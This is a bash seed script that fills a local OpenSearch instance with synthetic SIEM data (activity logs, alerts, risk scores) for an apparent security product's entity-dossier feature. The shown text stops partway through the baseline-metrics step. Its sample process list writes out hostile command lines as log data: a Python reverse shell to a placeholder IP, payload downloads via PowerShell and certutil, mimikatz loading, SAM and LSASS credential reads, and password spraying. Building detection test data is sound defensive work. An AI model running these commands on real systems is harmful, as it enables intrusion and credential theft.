#!/usr/bin/env bash
# =============================================================================
# seed-entity-dossier.sh — Sprint 46 Entity Dossier test data
#
# Extends Sprint 45 entity seed with dossier-level data:
#   - 50-200 activity events per entity in v3-hive-log-*
#   - risk_drivers, risk_history, baseline_metrics on entity documents
#   - 300 relationship edges in v3-hive-relationship-*
#   - 2-15 alerts per entity in v3-hive-alert-* with MITRE mappings
#   - Source coverage metadata
#
# Targets 40 high-risk entities from the Sprint 45 seed.
#
# Usage:
#   cd local-dev && bash seed-entity-dossier.sh
#   cd local-dev && bash seed-entity-dossier.sh --teardown
#
# Prerequisites:
#   - OpenSearch on https://localhost:9200 (admin / LocalDev@2024!)
#   - Sprint 45 entity seed already applied (seed-entity-inventory.sh)
# =============================================================================
set -euo pipefail

OS_URL="https://localhost:9200"
OS_USER="admin"
OS_PASS='LocalDev@2024!'
CURL_OS="curl -sk -u ${OS_USER}:${OS_PASS}"

BOLD='\033[1m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
YELLOW='\033[0;33m'; RED='\033[0;31m'; NC='\033[0m'
info()   { echo -e "${CYAN}  →${NC} $*"; }
ok()     { echo -e "${GREEN}  ✓${NC} $*"; }
warn()   { echo -e "${YELLOW}  ⚠${NC} $*"; }
fail()   { echo -e "${RED}  ✗${NC} $*"; }
header() { echo -e "\n${BOLD}$*${NC}"; }

# ─── Date helpers ────────────────────────────────────────────────────────────────
NOW_EPOCH=$(date +%s)
days_ago() {
  local days=$1
  if [[ "$(uname)" == "Darwin" ]]; then
    date -u -j -f "%s" "$(( NOW_EPOCH - days * 86400 ))" "+%Y-%m-%dT%H:%M:%S.000Z"
  else
    date -u -d "@$(( NOW_EPOCH - days * 86400 ))" "+%Y-%m-%dT%H:%M:%S.000Z"
  fi
}

hours_ago() {
  local hours=$1
  if [[ "$(uname)" == "Darwin" ]]; then
    date -u -j -f "%s" "$(( NOW_EPOCH - hours * 3600 ))" "+%Y-%m-%dT%H:%M:%S.000Z"
  else
    date -u -d "@$(( NOW_EPOCH - hours * 3600 ))" "+%Y-%m-%dT%H:%M:%S.000Z"
  fi
}

random_ts_last_14d() {
  # Generate a timestamp within last 14 days with business-hours weighting
  local day_offset=$(( RANDOM % 14 ))
  local hour
  # 70% chance of business hours (8-18), 30% off-hours
  if (( RANDOM % 10 < 7 )); then
    hour=$(( 8 + RANDOM % 10 ))
  else
    hour=$(( RANDOM % 24 ))
  fi
  local minute=$(( RANDOM % 60 ))
  local second=$(( RANDOM % 60 ))
  local ts_epoch=$(( NOW_EPOCH - day_offset * 86400 - (24 - hour) * 3600 + minute * 60 + second ))
  if [[ "$(uname)" == "Darwin" ]]; then
    date -u -j -f "%s" "$ts_epoch" "+%Y-%m-%dT%H:%M:%S.000Z"
  else
    date -u -d "@$ts_epoch" "+%Y-%m-%dT%H:%M:%S.000Z"
  fi
}

random_ts_last_48h() {
  # Generate a timestamp within last 48 hours (for high-risk entity spikes)
  local hours_offset=$(( RANDOM % 48 ))
  local minute=$(( RANDOM % 60 ))
  local second=$(( RANDOM % 60 ))
  local ts_epoch=$(( NOW_EPOCH - hours_offset * 3600 - minute * 60 - second ))
  if [[ "$(uname)" == "Darwin" ]]; then
    date -u -j -f "%s" "$ts_epoch" "+%Y-%m-%dT%H:%M:%S.000Z"
  else
    date -u -d "@$ts_epoch" "+%Y-%m-%dT%H:%M:%S.000Z"
  fi
}

# ─── Teardown ───────────────────────────────────────────────────────────────────
teardown() {
  header "Teardown — removing Sprint 46 entity dossier seed data"
  info "Deleting activity logs seeded by this script..."
  ${CURL_OS} -X POST "${OS_URL}/v3-hive-log-cwm/_delete_by_query" \
    -H "Content-Type: application/json" \
    -d '{"query":{"term":{"event.dataset":"entity-dossier-seed"}}}' 2>/dev/null > /dev/null || true
  ${CURL_OS} -X POST "${OS_URL}/v3-hive-log-workmates1/_delete_by_query" \
    -H "Content-Type: application/json" \
    -d '{"query":{"term":{"event.dataset":"entity-dossier-seed"}}}' 2>/dev/null > /dev/null || true
  info "Deleting alerts seeded by this script..."
  ${CURL_OS} -X POST "${OS_URL}/v3-hive-alert-cwm/_delete_by_query" \
    -H "Content-Type: application/json" \
    -d '{"query":{"term":{"event.dataset":"entity-dossier-seed"}}}' 2>/dev/null > /dev/null || true
  ${CURL_OS} -X POST "${OS_URL}/v3-hive-alert-workmates1/_delete_by_query" \
    -H "Content-Type: application/json" \
    -d '{"query":{"term":{"event.dataset":"entity-dossier-seed"}}}' 2>/dev/null > /dev/null || true
  info "Deleting relationship indices..."
  ${CURL_OS} -X DELETE "${OS_URL}/v3-hive-relationship-cwm" 2>/dev/null > /dev/null || true
  ${CURL_OS} -X DELETE "${OS_URL}/v3-hive-relationship-workmates1" 2>/dev/null > /dev/null || true
  ok "Sprint 46 dossier seed data removed"
  exit 0
}
[[ "${1:-}" == "--teardown" ]] && teardown

echo ""
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  HiveArmor — Sprint 46 Entity Dossier Seed                         ${NC}"
echo -e "${BOLD}  (40 entities × activity + alerts + relationships + risk data)      ${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
info "OpenSearch: ${OS_URL}"
echo ""

# ─── Entity Definitions ─────────────────────────────────────────────────────────
# 40 key entities from Sprint 45 seed (top risk)
# Format: ID|TYPE|VALUE|TENANT_INDEX|RISK_SCORE|TREND

declare -a ENTITIES=(
  "ent-host-eng-srv-001|host|ENG-SRV-001|cwm|95|rising"
  "ent-host-dc-001|host|DC-001|cwm|91|rising"
  "ent-host-fin-wks-001|host|FIN-WKS-001|cwm|88|rising"
  "ent-host-dc-002|host|DC-002|cwm|84|stable"
  "ent-host-eng-srv-010|host|ENG-SRV-010|cwm|82|rising"
  "ent-host-fin-wks-003|host|FIN-WKS-003|cwm|68|rising"
  "ent-host-fin-wks-010|host|FIN-WKS-010|cwm|70|rising"
  "ent-host-fin-wks-002|host|FIN-WKS-002|cwm|74|stable"
  "ent-host-eng-srv-002|host|ENG-SRV-002|cwm|72|stable"
  "ent-host-eng-srv-007|host|ENG-SRV-007|cwm|55|rising"
  "ent-host-fin-wks-007|host|FIN-WKS-007|cwm|63|stable"
  "ent-host-dc-003|host|DC-003|cwm|62|stable"
  "ent-host-eng-srv-015|host|ENG-SRV-015|workmates1|83|rising"
  "ent-host-fin-wks-013|host|FIN-WKS-013|workmates1|76|stable"
  "ent-user-admin-svc-01|user|admin-svc-01|cwm|93|rising"
  "ent-user-admin-svc-02|user|admin-svc-02|cwm|87|rising"
  "ent-user-sarah-chen|user|sarah.chen|cwm|85|rising"
  "ent-user-admin-svc-04|user|admin-svc-04|cwm|80|stable"
  "ent-user-priya-sharma|user|priya.sharma|cwm|78|rising"
  "ent-user-alex-turner|user|alex.turner|cwm|77|stable"
  "ent-user-svc-backup|user|svc-backup|cwm|76|stable"
  "ent-user-sarah-johnson|user|sarah.johnson|cwm|73|stable"
  "ent-user-james-wilson|user|james.wilson|cwm|71|declining"
  "ent-user-marcus-bailey|user|marcus.bailey|cwm|69|stable"
  "ent-user-admin-svc-05|user|admin-svc-05|cwm|67|stable"
  "ent-user-carlos-rodriguez|user|carlos.rodriguez|cwm|66|declining"
  "ent-user-kevin-wright|user|kevin.wright|cwm|65|stable"
  "ent-user-tom-huang|user|tom.huang|cwm|64|stable"
  "ent-user-david-nakamura|user|david.nakamura|cwm|63|declining"
  "ent-ip-203-0-113-10|ip|203.0.113.10|cwm|96|rising"
  "ent-ip-198-51-100-5|ip|198.51.100.5|cwm|89|rising"
  "ent-ip-203-0-113-22|ip|203.0.113.22|cwm|82|stable"
  "ent-ip-203-0-113-45|ip|203.0.113.45|cwm|77|stable"
  "ent-ip-198-51-100-20|ip|198.51.100.20|cwm|75|declining"
  "ent-ip-10-1-10-15|ip|10.1.10.15|cwm|68|stable"
  "ent-domain-cdn-update-xyz|domain|cdn-update.xyz|cwm|97|rising"
  "ent-domain-secure-login-portal-net|domain|secure-login-portal.net|cwm|94|rising"
  "ent-domain-microsft-update-com|domain|microsft-update.com|cwm|90|rising"
  "ent-domain-dl-patch-info|domain|dl-patch.info|cwm|86|stable"
)

# ─── Risk Driver Categories ─────────────────────────────────────────────────────
declare -a RISK_DRIVER_CATEGORIES=(
  "lateral_movement"
  "malware_execution"
  "credential_access"
  "data_exfiltration"
  "baseline_deviation"
  "brute_force_target"
  "privilege_escalation"
  "c2_communication"
)

declare -a RISK_DRIVER_DESCRIPTIONS=(
  "Lateral movement detected: SMB connections to multiple hosts in short timeframe"
  "Suspicious process execution: encoded PowerShell commands with download cradle"
  "Credential harvesting: LSASS memory access and SAM database reads detected"
  "Data exfiltration risk: large outbound transfers to external IPs on non-standard ports"
  "Significant baseline deviation: login frequency 4.2x above normal for this entity"
  "Brute force target: 847 failed authentication attempts from 12 unique sources in 24h"
  "Privilege escalation: service account used outside normal scope with admin-level access"
  "C2 communication: periodic beaconing pattern to known malicious infrastructure detected"
)

# ─── MITRE ATT&CK Techniques ────────────────────────────────────────────────────
declare -a MITRE_TECHNIQUES=(
  "T1059.001|Command and Scripting Interpreter: PowerShell|execution"
  "T1021.002|Remote Services: SMB/Windows Admin Shares|lateral_movement"
  "T1003.001|OS Credential Dumping: LSASS Memory|credential_access"
  "T1078|Valid Accounts|defense_evasion"
  "T1048|Exfiltration Over Alternative Protocol|exfiltration"
  "T1071.001|Application Layer Protocol: Web Protocols|command_and_control"
  "T1053.005|Scheduled Task/Job: Scheduled Task|persistence"
  "T1558.003|Steal or Forge Kerberos Tickets: Kerberoasting|credential_access"
)

# ─── Process Execution Templates ────────────────────────────────────────────────
declare -a PROCESS_COMMANDS=(
  "powershell.exe|-NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A"
  "powershell.exe|-Command \"Invoke-WebRequest -Uri https://cdn-update.xyz/payload -OutFile C:\\Windows\\Temp\\svc.exe\""
  "powershell.exe|-WindowStyle Hidden -Command \"Get-ADComputer -Filter * | Select-Object Name,DNSHostName\""
  "cmd.exe|/c whoami /priv && net user /domain"
  "cmd.exe|/c reg query HKLM\\SAM\\SAM\\Domains\\Account\\Users /s"
  "cmd.exe|/c net group \"Domain Admins\" /domain"
  "python3|/tmp/.cache/recon.py --target 10.1.0.0/16 --scan-ports 445,3389,22"
  "python3|-c \"import socket;s=socket.socket();s.connect(('203.0.113.10',4444));exec(s.recv(4096))\""
  "certutil.exe|-urlcache -split -f https://microsft-update.com/cert.dll C:\\Windows\\Temp\\cert.dll"
  "certutil.exe|-encode C:\\Users\\admin\\Documents\\sensitive.xlsx C:\\Temp\\upload.b64"
  "powershell.exe|-Command \"[System.Reflection.Assembly]::LoadFile('C:\\Temp\\mimikatz.dll')\""
  "cmd.exe|/c schtasks /create /tn \"WindowsUpdate\" /tr C:\\Windows\\Temp\\svc.exe /sc hourly"
  "python3|/opt/tools/spray.py --dc DC-001 --users users.txt --password Summer2024!"
  "powershell.exe|-Command \"Get-Process lsass | ForEach { $_.Modules } | Out-File C:\\Temp\\dump.txt\""
  "cmd.exe|/c wmic process list full > C:\\Windows\\Temp\\procs.txt"
)

# ─── Network Connection Templates ───────────────────────────────────────────────
declare -a NETWORK_DEST_IPS=(
  "203.0.113.10" "198.51.100.5" "203.0.113.22" "203.0.113.45" "198.51.100.20"
  "10.1.10.15" "10.1.10.20" "10.1.10.50" "10.1.20.1" "10.1.20.10"
  "10.1.30.5" "10.1.30.100" "172.16.0.1" "172.16.0.50" "8.8.8.8"
)
declare -a NETWORK_PORTS=( 443 445 22 3389 53 80 8080 8443 4444 9090 )
declare -a NETWORK_SRC_IPS=(
  "10.1.10.5" "10.1.10.12" "10.1.20.3" "10.1.20.15" "10.1.30.8"
  "10.1.30.22" "192.168.1.10" "192.168.1.50" "192.168.2.100" "10.1.10.200"
)

# ─── Authentication Templates ───────────────────────────────────────────────────
declare -a AUTH_USERS=(
  "admin-svc-01" "admin-svc-02" "sarah.chen" "priya.sharma" "alex.turner"
  "svc-backup" "sarah.johnson" "james.wilson" "marcus.bailey" "kevin.wright"
  "tom.huang" "david.nakamura" "carlos.rodriguez" "admin-svc-04" "admin-svc-05"
)
declare -a AUTH_ACTIONS=( "login_success" "login_failed" "session_created" "logout" "password_change" )

# ─── File Operation Templates ────────────────────────────────────────────────────
declare -a FILE_PATHS=(
  "C:\\Windows\\Temp\\svc.exe"
  "C:\\Windows\\Temp\\payload.dll"
  "C:\\Users\\Public\\Documents\\recon_output.txt"
  "/tmp/.cache/beacon.sh"
  "/tmp/.hidden/collector.py"
  "C:\\Windows\\System32\\drivers\\maldrv.sys"
  "C:\\ProgramData\\Microsoft\\Windows\\WER\\dump.dmp"
  "/var/tmp/.x11/keylog.dat"
  "C:\\Windows\\Temp\\mimikatz.log"
  "C:\\Users\\admin\\AppData\\Local\\Temp\\cred_dump.txt"
  "/etc/cron.d/.hidden_task"
  "C:\\Windows\\Tasks\\WindowsUpdate.job"
)
declare -a FILE_ACTIONS=( "created" "modified" "deleted" "renamed" "permissions_changed" )

# ─── DNS Query Templates ─────────────────────────────────────────────────────────
declare -a DNS_QUERIES=(
  "cdn-update.xyz"
  "secure-login-portal.net"
  "microsft-update.com"
  "dl-patch.info"
  "dc-001.corp.local"
  "dc-002.corp.local"
  "mail.corp.local"
  "fileserver.corp.local"
  "vpn.corp.local"
  "api.corp.local"
  "c2-node-alpha.dynamic-dns.net"
  "exfil-drop.onion.ws"
  "update-check.microsft-cdn.xyz"
  "login-verify.secure-portal.info"
)

# ─── Alert Title Templates ───────────────────────────────────────────────────────
declare -a ALERT_TITLES=(
  "Suspicious PowerShell Execution - Encoded Command"
  "Lateral Movement via SMB Admin Shares"
  "Credential Dumping - LSASS Memory Access"
  "Valid Account Usage Outside Business Hours"
  "Large Data Transfer to External IP"
  "HTTP C2 Beacon Detected - Regular Interval"
  "Scheduled Task Created for Persistence"
  "Kerberoasting Activity Detected"
  "Brute Force Authentication Attempt"
  "Privilege Escalation via Service Account"
  "DNS Query to Known Malicious Domain"
  "Certutil Used for File Download"
  "Process Injection Detected"
  "Suspicious Registry Modification"
  "Abnormal Outbound Connection Volume"
)
declare -a ALERT_SEVERITIES=( "critical" "high" "high" "medium" "high" "critical" "medium" "high" "medium" "high" "high" "medium" "critical" "medium" "high" )

# ─── Relationship Type Definitions ──────────────────────────────────────────────
# Type|Count target
# authenticated_to: 60, communicated_with: 80, executed_on: 40,
# accessed_from: 50, transferred_data: 30, part_of_group: 20, same_subnet: 20

# =============================================================================
# STEP 1: Create required indices (idempotent)
# =============================================================================
header "Step 1: Create required indices"

# Create log indices if they don't exist
for IDX in v3-hive-log-cwm v3-hive-log-workmates1; do
  ${CURL_OS} -X PUT "${OS_URL}/${IDX}" \
    -H "Content-Type: application/json" \
    -d '{"settings":{"number_of_shards":1,"number_of_replicas":0}}' \
    2>/dev/null > /dev/null || true
done
ok "Log indices ready"

# Create alert indices if they don't exist
for IDX in v3-hive-alert-cwm v3-hive-alert-workmates1; do
  ${CURL_OS} -X PUT "${OS_URL}/${IDX}" \
    -H "Content-Type: application/json" \
    -d '{"settings":{"number_of_shards":1,"number_of_replicas":0}}' \
    2>/dev/null > /dev/null || true
done
ok "Alert indices ready"

# Create relationship indices
for IDX in v3-hive-relationship-cwm v3-hive-relationship-workmates1; do
  ${CURL_OS} -X PUT "${OS_URL}/${IDX}" \
    -H "Content-Type: application/json" \
    -d '{"settings":{"number_of_shards":1,"number_of_replicas":0}}' \
    2>/dev/null > /dev/null || true
done
ok "Relationship indices ready"

# =============================================================================
# STEP 2: Seed activity events (50-200 per entity) into v3-hive-log-*
# =============================================================================
header "Step 2: Generate activity events for 40 key entities"

ACTIVITY_BULK=$(mktemp /tmp/ha_dossier_activity_XXXXXX.ndjson)
trap "rm -f ${ACTIVITY_BULK}" EXIT

ACTIVITY_COUNT=0

for ENTITY_DEF in "${ENTITIES[@]}"; do
  IFS='|' read -r ENT_ID ENT_TYPE ENT_VALUE TENANT RISK_SCORE TREND <<< "$ENTITY_DEF"
  LOG_IDX="v3-hive-log-${TENANT}"

  # Higher risk = more events; rising trend = more events in last 48h
  local_event_count=$(( 50 + (RISK_SCORE * 150 / 100) ))
  # Cap at 200
  (( local_event_count > 200 )) && local_event_count=200

  # Determine spike ratio: rising entities get 40% of events in last 48h
  if [[ "$TREND" == "rising" ]]; then
    spike_count=$(( local_event_count * 40 / 100 ))
  else
    spike_count=$(( local_event_count * 15 / 100 ))
  fi
  normal_count=$(( local_event_count - spike_count ))

  for (( i=0; i<local_event_count; i++ )); do
    # Determine timestamp
    if (( i < spike_count )); then
      TS=$(random_ts_last_48h)
    else
      TS=$(random_ts_last_14d)
    fi

    # Rotate through event types
    EVENT_TYPE_IDX=$(( i % 5 ))
    DOC_ID="${ENT_ID}-activity-${i}"

    case $EVENT_TYPE_IDX in
      0) # process_execution
        CMD_IDX=$(( RANDOM % ${#PROCESS_COMMANDS[@]} ))
        IFS='|' read -r PROC_NAME PROC_CMDLINE <<< "${PROCESS_COMMANDS[$CMD_IDX]}"
        SRC_IP="${NETWORK_SRC_IPS[$(( RANDOM % ${#NETWORK_SRC_IPS[@]} ))]}"
        printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$LOG_IDX" "$DOC_ID" >> "$ACTIVITY_BULK"
        printf '{"@timestamp":"%s","event.action":"process_execution","event.category":"execution","event.dataset":"entity-dossier-seed","host.name":"%s","user.name":"%s","process.name":"%s","process.command_line":"%s","source.ip":"%s","agent.type":"endpoint_agent","tenantId":%s}\n' \
          "$TS" \
          "$([ "$ENT_TYPE" == "host" ] && echo "$ENT_VALUE" || echo "ENG-SRV-001")" \
          "${AUTH_USERS[$(( RANDOM % ${#AUTH_USERS[@]} ))]}" \
          "$PROC_NAME" "$PROC_CMDLINE" "$SRC_IP" \
          "$([ "$TENANT" == "cwm" ] && echo "1" || echo "2")" >> "$ACTIVITY_BULK"
        ;;
      1) # network_connection
        DEST_IP="${NETWORK_DEST_IPS[$(( RANDOM % ${#NETWORK_DEST_IPS[@]} ))]}"
        DEST_PORT="${NETWORK_PORTS[$(( RANDOM % ${#NETWORK_PORTS[@]} ))]}"
        SRC_IP="${NETWORK_SRC_IPS[$(( RANDOM % ${#NETWORK_SRC_IPS[@]} ))]}"
        BYTES_OUT=$(( RANDOM % 500000 + 100 ))
        printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$LOG_IDX" "$DOC_ID" >> "$ACTIVITY_BULK"
        printf '{"@timestamp":"%s","event.action":"network_connection","event.category":"network","event.dataset":"entity-dossier-seed","host.name":"%s","source.ip":"%s","destination.ip":"%s","destination.port":%d,"network.bytes":%d,"network.direction":"outbound","agent.type":"network_sensor","tenantId":%s}\n' \
          "$TS" \
          "$([ "$ENT_TYPE" == "host" ] && echo "$ENT_VALUE" || echo "ENG-SRV-001")" \
          "$SRC_IP" "$DEST_IP" "$DEST_PORT" "$BYTES_OUT" \
          "$([ "$TENANT" == "cwm" ] && echo "1" || echo "2")" >> "$ACTIVITY_BULK"
        ;;
      2) # authentication
        AUTH_USER="${AUTH_USERS[$(( RANDOM % ${#AUTH_USERS[@]} ))]}"
        AUTH_ACTION="${AUTH_ACTIONS[$(( RANDOM % ${#AUTH_ACTIONS[@]} ))]}"
        SRC_IP="${NETWORK_SRC_IPS[$(( RANDOM % ${#NETWORK_SRC_IPS[@]} ))]}"
        printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$LOG_IDX" "$DOC_ID" >> "$ACTIVITY_BULK"
        printf '{"@timestamp":"%s","event.action":"%s","event.category":"authentication","event.dataset":"entity-dossier-seed","host.name":"%s","user.name":"%s","source.ip":"%s","destination.ip":"10.1.10.1","event.outcome":"%s","agent.type":"identity_provider","tenantId":%s}\n' \
          "$TS" "$AUTH_ACTION" \
          "$([ "$ENT_TYPE" == "host" ] && echo "$ENT_VALUE" || echo "DC-001")" \
          "$([ "$ENT_TYPE" == "user" ] && echo "$ENT_VALUE" || echo "$AUTH_USER")" \
          "$SRC_IP" \
          "$([ "$AUTH_ACTION" == "login_failed" ] && echo "failure" || echo "success")" \
          "$([ "$TENANT" == "cwm" ] && echo "1" || echo "2")" >> "$ACTIVITY_BULK"
        ;;
      3) # file_operation
        FILE_PATH="${FILE_PATHS[$(( RANDOM % ${#FILE_PATHS[@]} ))]}"
        FILE_ACTION="${FILE_ACTIONS[$(( RANDOM % ${#FILE_ACTIONS[@]} ))]}"
        printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$LOG_IDX" "$DOC_ID" >> "$ACTIVITY_BULK"
        printf '{"@timestamp":"%s","event.action":"file_%s","event.category":"file","event.dataset":"entity-dossier-seed","host.name":"%s","user.name":"%s","file.path":"%s","file.size":%d,"agent.type":"endpoint_agent","tenantId":%s}\n' \
          "$TS" "$FILE_ACTION" \
          "$([ "$ENT_TYPE" == "host" ] && echo "$ENT_VALUE" || echo "FIN-WKS-001")" \
          "${AUTH_USERS[$(( RANDOM % ${#AUTH_USERS[@]} ))]}" \
          "$FILE_PATH" "$(( RANDOM % 10000000 + 1024 ))" \
          "$([ "$TENANT" == "cwm" ] && echo "1" || echo "2")" >> "$ACTIVITY_BULK"
        ;;
      4) # dns_query
        DNS_QUERY="${DNS_QUERIES[$(( RANDOM % ${#DNS_QUERIES[@]} ))]}"
        SRC_IP="${NETWORK_SRC_IPS[$(( RANDOM % ${#NETWORK_SRC_IPS[@]} ))]}"
        printf '{"index":{"_index":"%s","_id":"%s"}}\n' "$LOG_IDX" "$DOC_ID" >> "$ACTIVITY_BULK"
        printf '{"@timestamp":"%s","event.action":"dns_query","event.category":"network","event.dataset":"entity-dossier-seed","host.name":"%s","source.ip":"%s","dns.question.name":"%s","dns.question.type":"A","dns.response_code":"NOERROR","destination.port":53,"agent.type":"network_sensor","tenantId":%s}\n' \
          "$TS" \
          "$([ "$ENT_TYPE" == "host" ] && echo "$ENT_VALUE" || echo "DC-001")" \
          "$SRC_IP" "$DNS_QUERY" \
          "$([ "$TENANT" == "cwm" ] && echo "1" || echo "2")" >> "$ACTIVITY_BULK"
        ;;
    esac
    (( ACTIVITY_COUNT++ ))
  done
done

info "Generated ${ACTIVITY_COUNT} activity events, indexing via _bulk..."
# Split into chunks of 2000 lines (1000 docs) to avoid request-too-large
split -l 2000 "$ACTIVITY_BULK" /tmp/ha_dossier_activity_chunk_
for CHUNK in /tmp/ha_dossier_activity_chunk_*; do
  RESPONSE=$(${CURL_OS} -X POST "${OS_URL}/_bulk" \
    -H "Content-Type: application/x-ndjson" \
    --data-binary "@${CHUNK}" 2>/dev/null)
  if echo "$RESPONSE" | grep -q '"errors":true'; then
    warn "Some bulk indexing errors in activity events (non-fatal)"
  fi
  rm -f "$CHUNK"
done
rm -f "$ACTIVITY_BULK"
ok "Activity events indexed: ${ACTIVITY_COUNT} total"

# =============================================================================
# STEP 3: Update entity documents with risk_drivers (3-8 per entity)
# =============================================================================
header "Step 3: Add risk_drivers to 40 key entities"

DRIVER_COUNT=0
for ENTITY_DEF in "${ENTITIES[@]}"; do
  IFS='|' read -r ENT_ID ENT_TYPE ENT_VALUE TENANT RISK_SCORE TREND <<< "$ENTITY_DEF"
  ENTITY_IDX="v3-hive-entity-${TENANT}"

  # Number of drivers: scale with risk score (3-8)
  NUM_DRIVERS=$(( 3 + RISK_SCORE * 5 / 100 ))
  (( NUM_DRIVERS > 8 )) && NUM_DRIVERS=8

  DRIVERS_JSON="["
  for (( d=0; d<NUM_DRIVERS; d++ )); do
    DRIVER_IDX=$(( (RANDOM + d) % ${#RISK_DRIVER_CATEGORIES[@]} ))
    CATEGORY="${RISK_DRIVER_CATEGORIES[$DRIVER_IDX]}"
    DESCRIPTION="${RISK_DRIVER_DESCRIPTIONS[$DRIVER_IDX]}"
    CONTRIBUTION=$(( 10 + RANDOM % 30 ))
    LAST_SEEN=$(hours_ago $(( RANDOM % 72 )))
    if (( d > 0 )); then DRIVERS_JSON+=","; fi
    DRIVERS_JSON+="{\"id\":\"drv-${ENT_ID}-${d}\",\"category\":\"${CATEGORY}\",\"description\":\"${DESCRIPTION}\",\"contribution\":${CONTRIBUTION},\"evidence\":\"Multiple events correlated\",\"lastSeen\":\"${LAST_SEEN}\"}"
  done
  DRIVERS_JSON+="]"

  ${CURL_OS} -X POST "${OS_URL}/${ENTITY_IDX}/_update/${ENT_ID}" \
    -H "Content-Type: application/json" \
    -d "{\"doc\":{\"risk_drivers\":${DRIVERS_JSON}},\"doc_as_upsert\":true}" \
    2>/dev/null > /dev/null
  (( DRIVER_COUNT++ ))
done
ok "Risk drivers added to ${DRIVER_COUNT} entities"

# =============================================================================
# STEP 4: Update entity documents with risk_history (30 daily scores)
# =============================================================================
header "Step 4: Add risk_history (30 daily scores) to 40 key entities"

HISTORY_COUNT=0
for ENTITY_DEF in "${ENTITIES[@]}"; do
  IFS='|' read -r ENT_ID ENT_TYPE ENT_VALUE TENANT RISK_SCORE TREND <<< "$ENTITY_DEF"
  ENTITY_IDX="v3-hive-entity-${TENANT}"

  HISTORY_JSON="["
  for (( day=29; day>=0; day-- )); do
    DATE_STR=$(days_ago $day)
    # Generate score based on trend
    case "$TREND" in
      rising)
        # Gradual increase last 7 days: starts 20-40 below current
        if (( day > 7 )); then
          DAILY_SCORE=$(( RISK_SCORE - 25 - RANDOM % 10 + (29 - day) ))
        else
          DAILY_SCORE=$(( RISK_SCORE - (day * 4) + RANDOM % 3 ))
        fi
        ;;
      declining)
        # Decrease over time: was higher, now lower
        if (( day > 7 )); then
          DAILY_SCORE=$(( RISK_SCORE + 15 + RANDOM % 5 ))
        else
          DAILY_SCORE=$(( RISK_SCORE + (day * 2) + RANDOM % 3 ))
        fi
        ;;
      stable)
        # Flat with small noise
        DAILY_SCORE=$(( RISK_SCORE - 3 + RANDOM % 7 ))
        ;;
    esac
    # Clamp between 0 and 100
    (( DAILY_SCORE < 0 )) && DAILY_SCORE=0
    (( DAILY_SCORE > 100 )) && DAILY_SCORE=100

    if (( day < 29 )); then HISTORY_JSON+=","; fi
    HISTORY_JSON+="{\"date\":\"${DATE_STR}\",\"score\":${DAILY_SCORE}}"
  done
  HISTORY_JSON+="]"

  ${CURL_OS} -X POST "${OS_URL}/${ENTITY_IDX}/_update/${ENT_ID}" \
    -H "Content-Type: application/json" \
    -d "{\"doc\":{\"risk_history\":${HISTORY_JSON}},\"doc_as_upsert\":true}" \
    2>/dev/null > /dev/null
  (( HISTORY_COUNT++ ))
done
ok "Risk history (30 days) added to ${HISTORY_COUNT} entities"

# =============================================================================
# STEP 5: Update entity documents with baseline_metrics
# =============================================================================
header "Step 5: Add baseline_metrics to 40 key entities"

BASELINE_COUNT=0
for ENTITY_DEF in "${ENTITIES[@]}"; do
  IFS='|' read -r ENT_ID ENT_TYPE ENT_VALUE TENANT RISK_SCORE TREND <<< "$ENTITY_DEF"
  ENTITY_IDX="v3-hive-entity-${TENANT}"

  # Generate metrics based on entity type
  if [[ "$ENT_TYPE" == "host" ]]; then
    # Host metrics: daily_login_count, network_bytes_out, process_unique_count, failed_auth_count
    BASE_LOGIN=$(( 5 + RANDOM % 20 ))
    CURR_LOGIN=$(( BASE_LOGIN + RISK_SCORE * BASE_LOGIN / 100 ))
    BASE_BYTES=$(( 100000 + RANDOM % 500000 ))
    CURR_BYTES=$(( BASE_BYTES + RISK_SCORE * BASE_BYTES / 50 ))
    BASE_PROC=$(( 30 + RANDOM % 50 ))
    CURR_PROC=$(( BASE_PROC + RISK_SCORE / 10 ))
    BASE_FAIL=$(( RANDOM % 5 ))
    CURR_FAIL=$(( BASE_FAIL + RISK_SCORE / 8 ))

    METRICS_JSON="{\"baseline_metrics\":{\"daily_login_count\":{\"current\":${CURR_LOGIN},\"baseline\":${BASE_LOGIN},\"unit\":\"count\"},\"network_bytes_out\":{\"current\":${CURR_BYTES},\"baseline\":${BASE_BYTES},\"unit\":\"bytes\"},\"process_unique_count\":{\"current\":${CURR_PROC},\"baseline\":${BASE_PROC},\"unit\":\"count\"},\"failed_auth_count\":{\"current\":${CURR_FAIL},\"baseline\":${BASE_FAIL},\"unit\":\"count\"}}}"
  elif [[ "$ENT_TYPE" == "user" ]]; then
    # User metrics: login_count, unique_hosts, after_hours_activity, privilege_escalation_count
    BASE_LOGIN=$(( 2 + RANDOM % 10 ))
    CURR_LOGIN=$(( BASE_LOGIN + RISK_SCORE * BASE_LOGIN / 80 ))
    BASE_HOSTS=$(( 1 + RANDOM % 4 ))
    CURR_HOSTS=$(( BASE_HOSTS + RISK_SCORE / 20 ))
    BASE_AFTER=$(( RANDOM % 3 ))
    CURR_AFTER=$(( BASE_AFTER + RISK_SCORE / 15 ))
    BASE_PRIV=$(( RANDOM % 2 ))
    CURR_PRIV=$(( BASE_PRIV + RISK_SCORE / 25 ))

    METRICS_JSON="{\"baseline_metrics\":{\"login_count\":{\"current\":${CURR_LOGIN},\"baseline\":${BASE_LOGIN},\"unit\":\"count\"},\"unique_hosts\":{\"current\":${CURR_HOSTS},\"baseline\":${BASE_HOSTS},\"unit\":\"count\"},\"after_hours_activity\":{\"current\":${CURR_AFTER},\"baseline\":${BASE_AFTER},\"unit\":\"count\"},\"privilege_escalation_count\":{\"current\":${CURR_PRIV},\"baseline\":${BASE_PRIV},\"unit\":\"count\"}}}"
  elif [[ "$ENT_TYPE" == "ip" ]]; then
    # IP metrics: connection_count, unique_destinations, bytes_transferred, port_scan_score
    BASE_CONN=$(( 10 + RANDOM % 100 ))
    CURR_CONN=$(( BASE_CONN + RISK_SCORE * 2 ))
